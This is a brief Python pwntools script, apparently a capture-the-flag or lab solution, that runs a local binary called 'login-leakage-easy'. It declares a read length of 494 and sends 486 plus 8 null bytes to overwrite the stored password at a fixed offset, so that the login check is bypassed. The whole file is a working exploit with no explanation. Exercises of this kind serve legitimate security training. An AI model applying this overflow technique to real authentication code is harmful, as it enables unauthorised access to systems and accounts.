from pwn import *

p = process("./login-leakage-easy")

password_at_offset = 486

x = p.clean()
print(x)

payload = b""
payload += b"\x00" * password_at_offset
payload += b"\x00" * 8

p.sendline(str(486 + 8).encode())
p.sendline(payload)

print(p.clean())

p.close()
